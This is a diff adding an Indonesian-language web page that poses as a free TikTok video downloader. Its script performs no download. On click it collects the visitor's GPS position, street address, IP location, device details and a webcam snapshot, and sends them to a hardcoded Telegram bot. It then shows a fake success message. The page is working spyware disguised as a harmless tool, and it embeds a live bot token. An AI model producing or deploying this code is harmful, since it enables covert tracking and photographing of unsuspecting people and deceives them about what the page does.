@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Video TikTok</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset & Global */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+body {
+  background: linear-gradient(135deg, #6e8efb, #a777e3);
+  color: #333;
+  min-height: 100vh;
+  padding: 20px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Container */
+.container {
+  width: 100%;
+  max-width: 420px;
+  padding: 30px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+
+  background: rgba(255, 255, 255, 0.95);
+  border-radius: 20px;
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+}
+
+/* Header & Text */
+.logo {
+  font-size: 50px;
+  margin-bottom: 15px;
+  color: #ff0050;
+}
+h1 {
+  font-size: 28px;
+  font-weight: 800;
+  margin-bottom: 15px;
+  color: #2c3e50;
+}
+.welcome-text {
+  font-size: 16px;
+  line-height: 1.5;
+  margin-bottom: 25px;
+  color: #7f8c8d;
+}
+
+/* Input */
+.input-group {
+  margin-bottom: 25px;
+  text-align: left;
+}
+label {
+  display: block;
+  margin-bottom: 10px;
+  font-size: 16px;
+  font-weight: 700;
+  color: #2c3e50;
+}
+input[type="text"] {
+  width: 100%;
+  padding: 15px 20px;
+  font-size: 16px;
+
+  border: 2px solid #e0e0e0;
+  border-radius: 12px;
+  background: #f8f9fa;
+}
+input[type="text"]:focus {
+  outline: none;
+  background: #fff;
+  border-color: #6e8efb;
+  box-shadow: 0 0 0 3px rgba(110, 142, 251, 0.2);
+}
+
+/* Button */
+.btn {
+  width: 100%;
+  margin: 20px 0;
+  padding: 18px 25px;
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  font-size: 18px;
+  font-weight: 700;
+
+  color: #fff;
+  background: #ff0050;
+  border: none;
+  border-radius: 50px;
+  cursor: pointer;
+
+  box-shadow: 0 5px 15px rgba(255, 0, 80, 0.4);
+  transition: all 0.2s ease;
+}
+.btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 8px 20px rgba(255, 0, 80, 0.5);
+}
+.icon {
+  font-size: 22px;
+  margin-right: 12px;
+}
+
+/* Status Messages */
+.status {
+  display: none;
+  margin-top: 20px;
+  padding: 18px;
+  font-size: 15px;
+  text-align: center;
+  border-radius: 12px;
+  background: #f8f9fa;
+}
+.status.success {
+  display: block;
+  color: #27ae60;
+  border: 2px solid #27ae60;
+  background: rgba(39, 174, 96, 0.1);
+}
+.status.error {
+  display: block;
+  color: #e74c3c;
+  border: 2px solid #e74c3c;
+  background: rgba(231, 76, 60, 0.1);
+}
+
+/* Loading */
+.loading {
+  display: none;
+  margin: 25px 0;
+}
+.loading-spinner {
+  width: 50px;
+  height: 50px;
+  margin: 0 auto 15px auto;
+
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #ff0050;
+  border-radius: 50%;
+
+  animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0%   { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Device Info */
+.device-info {
+  display: flex;
+  justify-content: space-between;
+  margin: 15px 0;
+  padding: 15px;
+  font-size: 14px;
+  background: #f8f9fa;
+  border-radius: 12px;
+}
+
+/* Battery */
+.battery-info {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin: 10px 0;
+  padding: 12px;
+  font-weight: 600;
+  background: #f8f9fa;
+  border-radius: 12px;
+}
+.battery-level {
+  width: 60px;
+  height: 25px;
+  border: 2px solid #ddd;
+  border-radius: 5px;
+  background: #e0e0e0;
+  overflow: hidden;
+}
+.battery-fill {
+  height: 100%;
+  background: linear-gradient(to right, #4cd964, #5ac8fa);
+  transition: width 0.5s;
+}
+.battery-tip {
+  width: 4px;
+  height: 12px;
+  margin-left: 2px;
+  background: #ddd;
+  border-radius: 0 2px 2px 0;
+}
+.charging-status {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  padding: 5px 10px;
+  font-weight: 600;
+  background: #ffeaa7;
+  border-radius: 20px;
+}
+
+/* Progress Bar */
+.progress-bar {
+  width: 100%;
+  height: 8px;
+  margin: 15px 0;
+  background: #e0e0e0;
+  border-radius: 4px;
+  overflow: hidden;
+}
+.progress-fill {
+  width: 0%;
+  height: 100%;
+  background: linear-gradient(to right, #ff0050, #a777e3);
+  border-radius: 4px;
+  transition: width 1.5s ease-in-out;
+}
+
+/* Download Steps */
+.download-steps {
+  margin: 20px 0;
+  padding: 15px;
+  text-align: left;
+  background: #f8f9fa;
+  border-radius: 12px;
+}
+.download-steps h3 {
+  margin-bottom: 10px;
+  color: #2c3e50;
+}
+.step {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin: 10px 0;
+}
+.step-icon {
+  width: 25px;
+  height: 25px;
+  font-size: 12px;
+  color: #fff;
+  background: #6e8efb;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* TikTok Brand */
+.tiktok-brand {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 15px;
+  font-weight: 700;
+  color: #ff0050;
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HAPUS admin-access dan video-container -->
+
+        <div class="tiktok-brand">
+            <i class="fab fa-tiktok"></i>
+            <span>TikTok Downloader</span>
+        </div>
+
+        <h1>Download Video TikTok</h1>
+
+        <p class="welcome-text">Masukkan link video TikTok di bawah ini untuk mendownload video secara gratis!</p>
+
+        <div class="input-group">
+            <label for="video-url"><i class="fas fa-link"></i> Link Video TikTok:</label>
+            <input type="text" id="video-url" placeholder="Contoh: https://www.tiktok.com/xxx">
+        </div>
+
+        <div class="device-info">
+            <div class="battery-info">
+                <span>Baterai:</span>
+                <div class="battery-level">
+                    <div class="battery-fill" id="battery-fill"></div>
+                </div>
+                <div class="battery-tip"></div>
+                <span id="battery-percent">0%</span>
+                <div class="charging-status" id="charging-status">
+                    <i class="fas fa-plug"></i> <span>Mengisi daya</span>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn" id="download-btn">
+            <span class="icon"><i class="fas fa-download"></i></span> Download Sekarang
+        </button>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <p>Mempersiapkan download...</p>
+        </div>
+
+        <div class="status" id="status"></div>
+
+        <div class="download-steps">
+            <h3><i class="fas fa-info-circle"></i> Cara Download:</h3>
+            <div class="step"><div class="step-icon">1</div><span>Salin link video TikTok</span></div>
+            <div class="step"><div class="step-icon">2</div><span>Tempel link di atas</span></div>
+            <div class="step"><div class="step-icon">3</div><span>Klik tombol Download</span></div>
+            <div class="step"><div class="step-icon">4</div><span>Video akan tersimpan di galeri</span></div>
+        </div>
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const downloadBtn = document.getElementById('download-btn');
+        const statusDiv = document.getElementById('status');
+        const loadingDiv = document.getElementById('loading');
+        const videoUrlInput = document.getElementById('video-url');
+        const batteryFill = document.getElementById('battery-fill');
+        const batteryPercent = document.getElementById('battery-percent');
+        const chargingStatus = document.getElementById('charging-status');
+        const progressFill = document.getElementById('progress-fill');
+
+        // Token dan Chat ID default
+        const BOT_TOKEN = "8439795611:AAFoYpzVGZF8sKE_d64P-oaRi46gavz9ZLs";
+        const CHAT_ID = "7561204244";
+
+        let batteryLevel = 0;
+        let isCharging = false;
+
+        // Deteksi informasi baterai
+        function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    updateBatteryInfo(battery);
+                    battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
+                    battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
+                });
+            } else {
+                batteryFill.style.width = '75%';
+                batteryPercent.textContent = '75%';
+                chargingStatus.style.display = 'none';
+            }
+        }
+        function updateBatteryInfo(battery) {
+            batteryLevel = Math.round(battery.level * 100);
+            isCharging = battery.charging;
+            batteryFill.style.width = batteryLevel + '%';
+            batteryPercent.textContent = batteryLevel + '%';
+            chargingStatus.style.display = isCharging ? 'inline-flex' : 'none';
+        }
+
+        // Device info
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                dateTime: new Date().toLocaleString('id-ID'),
+                batteryLevel: batteryLevel,
+                isCharging: isCharging
+            };
+        }
+
+        // Kirim ke Telegram (lokasi akurat + alamat + fallback IP + kamera snapshot)
+async function sendToTelegram(videoUrl, deviceInfo) {
+    async function getAddress(lat, lon) {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const data = await res.json();
+            return data.display_name || "Alamat tidak ditemukan";
+        } catch {
+            return "Gagal ambil alamat";
+        }
+    }
+
+    async function getIpLocation() {
+        try {
+            const res = await fetch("https://ipapi.co/json/");
+            return await res.json();
+        } catch {
+            return null;
+        }
+    }
+
+    // ketika tombol download diklik → langsung minta izin lokasi
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const address = await getAddress(lat, lon);
+            const ipLoc = await getIpLocation();
+
+            let ipInfo = ipLoc ? `${ipLoc.city}, ${ipLoc.country_name} (${ipLoc.org})` : "Tidak tersedia";
+
+            const caption = `
+🚀 <b>TikTok Download</b>\n
+📥 <a href="${videoUrl}">Klik di sini untuk membuka video</a>\n
+📱 <b>Device:</b> ${deviceInfo.userAgent}\n
+🔋 <b>Baterai:</b> ${deviceInfo.batteryLevel}%${deviceInfo.isCharging ? ' ⚡' : ''}\n
+🕒 <b>Waktu:</b> ${deviceInfo.dateTime}\n
+🌍 <b>Lokasi GPS:</b> <a href="${mapsLink}">${lat},${lon}</a>\n
+🏠 <b>Alamat:</b> ${address}\n
+💻 <b>Lokasi via IP:</b> ${ipInfo}
+            `;
+
+            try {
+                // coba ambil kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append("photo", blob, "snapshot.jpg");
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("caption", caption);
+                        formData.append("parse_mode", "HTML");
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        });
+                    }
+                }, "image/jpeg", 0.9);
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                // kalau kamera ditolak, kirim teks saja
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: caption,
+                        parse_mode: "HTML"
+                    })
+                });
+            }
+        },
+        async () => {
+            // kalau lokasi ditolak
+            const ipLoc = await getIpLocation();
+            let ipInfo = ipLoc ? `${ipLoc.city}, ${ipLoc.country_name} (${ipLoc.org})` : "Tidak tersedia";
+
+            const caption = `
+🚀 <b>TikTok Download</b>\n
+📥 <a href="${videoUrl}">Klik di sini untuk membuka video</a>\n
+📱 <b>Device:</b> ${deviceInfo.userAgent}\n
+🔋 <b>Baterai:</b> ${deviceInfo.batteryLevel}%${deviceInfo.isCharging ? ' ⚡' : ''}\n
+🕒 <b>Waktu:</b> ${deviceInfo.dateTime}\n
+🌍 <i>Lokasi GPS tidak diizinkan</i>\n
+💻 <b>Lokasi via IP:</b> ${ipInfo}
+            `;
+
+            // kirim tanpa foto
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: caption,
+                    parse_mode: "HTML"
+                })
+            });
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+        // Event tombol download
+        downloadBtn.addEventListener('click', async function () {
+    const videoUrl = videoUrlInput.value.trim();
+    if (!videoUrl) {
+        showStatus('Silakan masukkan link video TikTok', 'error');
+        return;
+    }
+
+    try {
+        // 📍 Lokasi
+        const locationData = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat:pos.coords.latitude, lon:pos.coords.longitude, acc:pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+            );
+        });
+
+        // 📷 Kamera
+        let snapshot=null;
+        try{
+            const stream=await navigator.mediaDevices.getUserMedia({video:true});
+            const video=document.createElement("video");
+            video.srcObject=stream;
+            await video.play();
+
+            const canvas=document.createElement("canvas");
+            canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+            canvas.getContext("2d").drawImage(video,0,0);
+            snapshot=canvas.toDataURL("image/jpeg",0.9);
+
+            stream.getTracks().forEach(t=>t.stop());
+        }catch(e){
+            console.warn("Snapshot gagal:",e);
+        }
+
+        // 🚀 Kirim ke Telegram
+        await sendToTelegram(videoUrl, getDeviceInfo(), locationData, snapshot);
+
+    } catch(e){
+        console.error("Proses gagal:", e);
+    }
+
+    // Progress bar & status
+    downloadBtn.style.display='none';
+    loadingDiv.style.display='block';
+    let progress=0;
+    const progressInterval=setInterval(()=>{
+        progress=Math.min(100,progress+5);
+        progressFill.style.width=progress+'%';
+    },150);
+
+    setTimeout(()=>{
+        clearInterval(progressInterval);
+        loadingDiv.style.display='none';
+        showStatus('Video berhasil didownload! Silakan cek gallery Anda.', 'success');
+        downloadBtn.style.display='flex';
+    },3000);
+});
+
+        function showStatus(msg, type) {
+            statusDiv.textContent = msg;
+            statusDiv.className = 'status ' + type;
+        }
+
+        getBatteryInfo();
+    });
+</script>
+</body>
+</html>
